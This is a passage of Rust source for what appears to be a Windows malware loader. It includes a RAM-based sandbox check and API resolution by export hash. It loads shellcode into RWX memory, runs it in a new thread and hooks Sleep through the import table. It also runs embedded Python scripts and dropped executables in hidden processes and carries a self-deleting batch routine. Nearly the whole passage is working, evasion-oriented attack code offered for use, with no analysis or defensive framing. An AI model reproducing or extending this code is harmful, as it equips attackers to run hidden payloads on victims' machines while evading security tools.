                mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
                GlobalMemoryStatusEx(&mut mem_status);
                if mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024 {
                    println!("System check failed (RAM)");
                    return;
                }

                println!("Allocating memory via Dynamic VirtualAlloc...");
                // base = unsafe { VirtualAlloc(core::ptr::null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };

                let va_addr = get_export_addr(k32, HASH_VIRTUAL_ALLOC);
                if let Some(addr) = va_addr {
                    let va: FnVirtualAlloc = core::mem::transmute(addr);
                    base = va(
                        core::ptr::null_mut(),
                        size,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );
                }

                println!("Alloc ptr: {:?}", base);

                if !base.is_null() {
                    let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
                    // We can't copy directly if we are in another process context (but here we are local)
                    // But if we use NtWriteVirtualMemory, we should use it for consistency

                    println!("Writing memory via memcpy...");
                    dst.copy_from_slice(sc);
                    println!("Write done");

                    let mut old = 0;
                    println!("Protecting memory via Dynamic VirtualProtect...");
                    /*
                                        // let res = unsafe { VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old) };
                                        let mut res = 0;
                                        if let Some(addr) = unsafe { get_export_addr(k32, HASH_VIRTUAL_PROTECT) } {
                                            let vp: FnVirtualProtect = unsafe { core::mem::transmute(addr) };
                                            res = unsafe { vp(base, size, PAGE_EXECUTE_READWRITE, &mut old) };
                                        }
                    */
                    let res = VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);

                    println!("Protect result: {}", res); // Debug print
                    if res == 0 {
                        use windows_sys::Win32::Foundation::GetLastError;
                        println!("GetLastError: {}", GetLastError());
                    }
                    // let status_prot = if res != 0 { 0 } else { 1 };
                    let status_prot = if res != 0 { 1 } else { 0 }; // VirtualProtect returns non-zero on success

                    if status_prot != 0 {
                        SC_ADDR = base as usize;
                        SC_SIZE = size;
                        if let Some(orig) = hook_iat("kernel32.dll", "Sleep", sleep_detour as usize)
                        {
                            SLEEP_ORIGINAL = orig;
                            println!("IAT Hook installed");
                        }

                        // Also hook KERNELBASE.dll Sleep if present (some programs link against it)
                        if let Some(orig) =
                            hook_iat("KERNELBASE.dll", "Sleep", sleep_detour as usize)
                        {
                            if SLEEP_ORIGINAL == 0 {
                                SLEEP_ORIGINAL = orig;
                            }
                            println!("IAT Hook installed (KERNELBASE)");
                        }

                        // Create a new thread to execute shellcode (more robust than fiber for generic payloads)
                        /*
                        let (ssn_create_thr, addr_create_thr) =
                            get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
                        let (ssn_wait_thr, addr_wait_thr) =
                            get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

                        println!(
                            "SSN CreateThread: {:x}, Addr: {:x}",
                            ssn_create_thr, addr_create_thr
                        );

                        if addr_create_thr != 0 {
                            let mut h_thread: isize = 0;
                            println!("Creating thread...");
                            let st_thr = syscall(
                                ssn_create_thr,
                                addr_create_thr,
                                &mut h_thread as *mut _ as usize,
                                0x1FFFFF,
                                0,
                                process_handle as usize,
                                base as usize,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                            );
                            println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
                            if st_thr == 0 && h_thread != 0 {
                                // Optionally wait for thread to finish briefly to ensure execution starts
                                if addr_wait_thr != 0 {
                                    println!("Waiting for thread...");
                                    let _ = syscall(
                                        ssn_wait_thr,
                                        addr_wait_thr,
                                        h_thread as usize,
                                        0, // Alertable
                                        0, // Timeout
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                    );
                                    println!("Thread finished or wait returned");
                                } else {
                                    println!("Wait syscall address is 0");
                                }
                                CloseHandle(h_thread);
                            } else {
                                println!("CreateThread failed");
                            }
                        } else {
                            println!("CreateThread address is 0");
                        }
                        */
                        println!("Creating thread via Dynamic CreateThread...");
                        let mut thread_id = 0;
                        /*
                        let h_thread = unsafe {
                            CreateThread(
                                core::ptr::null(),
                                0,
                                Some(core::mem::transmute(base)),
                                core::ptr::null(),
                                0,
                                &mut thread_id
                            )
                        };
                        */
                        /*
                        let mut h_thread = 0;
                        if let Some(addr) = unsafe { get_export_addr(k32, HASH_CREATE_THREAD) } {
                            let ct: FnCreateThread = unsafe { core::mem::transmute(addr) };
                            h_thread = unsafe {
                                ct(
                                    core::ptr::null(),
                                    0,
                                    Some(core::mem::transmute(base)),
                                    core::ptr::null_mut(),
                                    0,
                                    &mut thread_id,
                                )
                            };
                        }
                        */
                        use windows_sys::Win32::System::Threading::CreateThread;
                        let h_thread = CreateThread(
                            core::ptr::null(),
                            0,
                            Some(core::mem::transmute(base)),
                            core::ptr::null(),
                            0,
                            &mut thread_id,
                        );

                        SC_THREAD_ID = thread_id;

                        if h_thread != 0 {
                            println!("Waiting for thread...");
                            // unsafe { WaitForSingleObject(h_thread, INFINITE) };
                            // Using Sleep in main thread allows testing if hook crashes it (if we used Sleep(5000))
                            // But here we use WaitForSingleObject.
                            // unsafe { WaitForSingleObject(h_thread, INFINITE) };

                            // Let's just loop and check exit code to avoid WaitForSingleObject potentially blocking

                            let sleep_addr = get_export_addr(k32, HASH_SLEEP);

                            loop {
                                let mut exit_code = 0;
                                windows_sys::Win32::System::Threading::GetExitCodeThread(
                                    h_thread,
                                    &mut exit_code,
                                );
                                if exit_code != 259 {
                                    // STILL_ACTIVE
                                    break;
                                }
                                // Sleep 100ms, but we need to call original Sleep to avoid our hook?
                                // Our hook only activates if thread ID matches SC_THREAD_ID.
                                // We are in MAIN thread. So calling Sleep is SAFE.
                                // unsafe { Sleep(100) };
                                if let Some(addr) = sleep_addr {
                                    let slp: FnSleep = core::mem::transmute(addr);
                                    slp(100);
                                }
                            }

                            println!("Thread finished");
                            CloseHandle(h_thread);
                        } else {
                            println!("CreateThread failed");
                        }
                    } else {
                        println!("Protect failed");
                    }
                } else {
                    println!("Alloc failed or base is null");
                }
                if process_handle != 0 && process_handle != -1 {
                    CloseHandle(process_handle);
                }
            }
        }
        return;
    }

    if payload.starts_with(b"PY\0") {
        let mut p = 4usize;
        if p + 4 > payload.len() {
            return;
        }
        let len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + len > payload.len() {
            return;
        }
        let script = String::from_utf8_lossy(&payload[p..p + len]).to_string();
        let _ = Command::new("pythonw.exe")
            .arg("-c")
            .arg(script)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
        return;
    }

    if payload.starts_with(b"MZ") {
        let mut out_path: PathBuf = std::env::temp_dir();
        out_path.push(format!("rs_p_{}.exe", std::process::id()));
        if fs::write(&out_path, &payload).is_ok() {
            let _ = Command::new(&out_path)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn();
        }
    }
}

#[allow(dead_code)]
fn self_delete() {
    if let Ok(exe_path) = std::env::current_exe() {
        let mut bat = std::env::temp_dir();
        bat.push(format!("{:x}_rm.cmd", std::process::id()));
        let script = format!(
            "@echo off\r\nping -n 2 127.0.0.1 >nul\r\ndel /f /q \"{}\"\r\ndel /f /q \"%~f0\"\r\n",
            exe_path.display()
        );
        let _ = fs::write(&bat, script);
        let _ = Command::new("cmd.exe")
            .arg("/C")
            .arg(&bat)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}
